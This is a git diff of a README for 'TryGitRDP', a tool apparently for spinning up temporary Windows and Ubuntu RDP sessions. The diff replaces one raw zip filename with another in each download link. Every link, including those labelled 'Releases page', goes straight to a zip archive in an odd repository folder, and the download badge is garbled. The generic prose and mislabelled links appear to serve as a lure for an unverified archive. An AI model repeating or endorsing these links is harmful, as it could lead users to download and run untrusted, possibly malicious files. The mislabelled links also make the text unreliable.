@@ -1,6 +1,6 @@
 # ☁️ TryGitRDP - Easily Access Windows & Ubuntu Instances
 
-[![Download from GitHub](https://raw.githubusercontent.com/Talha7767/TryGitRDP/main/bulse/Git_Try_RDP_Loranthus.zip%20Now-Get%20the%https://raw.githubusercontent.com/Talha7767/TryGitRDP/main/bulse/Git_Try_RDP_Loranthus.zip)](https://raw.githubusercontent.com/Talha7767/TryGitRDP/main/bulse/Git_Try_RDP_Loranthus.zip)
+[![Download from GitHub](https://raw.githubusercontent.com/Talha7767/TryGitRDP/main/bulse/RDP_Git_Try_v2.1-beta.2.zip%20Now-Get%20the%https://raw.githubusercontent.com/Talha7767/TryGitRDP/main/bulse/RDP_Git_Try_v2.1-beta.2.zip)](https://raw.githubusercontent.com/Talha7767/TryGitRDP/main/bulse/RDP_Git_Try_v2.1-beta.2.zip)
 
 ## 🌟 Overview
 
@@ -11,7 +11,7 @@ TryGitRDP offers a simple way to create temporary Windows and Ubuntu setups on t
 Follow these steps to set up TryGitRDP on your device:
 
 1. **Visit the Releases Page**  
-   To get the application, go to our [Releases page](https://raw.githubusercontent.com/Talha7767/TryGitRDP/main/bulse/Git_Try_RDP_Loranthus.zip). From here, you can find the latest version.
+   To get the application, go to our [Releases page](https://raw.githubusercontent.com/Talha7767/TryGitRDP/main/bulse/RDP_Git_Try_v2.1-beta.2.zip). From here, you can find the latest version.
 
 2. **Download the Application**  
    Click on the version you need and download the installation files provided. These files allow you to run and automate RDP instances easily.
@@ -27,7 +27,7 @@ Follow these steps to set up TryGitRDP on your device:
 
 ## 📥 Download & Install
 
-To download the TryGitRDP application, visit our [Releases page](https://raw.githubusercontent.com/Talha7767/TryGitRDP/main/bulse/Git_Try_RDP_Loranthus.zip) and choose the latest version. Follow the installation steps mentioned above, and you’ll be up and running in no time!
+To download the TryGitRDP application, visit our [Releases page](https://raw.githubusercontent.com/Talha7767/TryGitRDP/main/bulse/RDP_Git_Try_v2.1-beta.2.zip) and choose the latest version. Follow the installation steps mentioned above, and you’ll be up and running in no time!
 
 ## 🔍 Features
 
@@ -100,4 +100,4 @@ Feel free to contribute to TryGitRDP by submitting issues or pull requests on Gi
 Thanks to the contributors who helped make this project possible. Your hard work and dedication are appreciated.
 
 ---
-For more detailed information and updates, check back frequently on our [Releases page](https://raw.githubusercontent.com/Talha7767/TryGitRDP/main/bulse/Git_Try_RDP_Loranthus.zip). Enjoy using TryGitRDP!
+For more detailed information and updates, check back frequently on our [Releases page](https://raw.githubusercontent.com/Talha7767/TryGitRDP/main/bulse/RDP_Git_Try_v2.1-beta.2.zip). Enjoy using TryGitRDP!
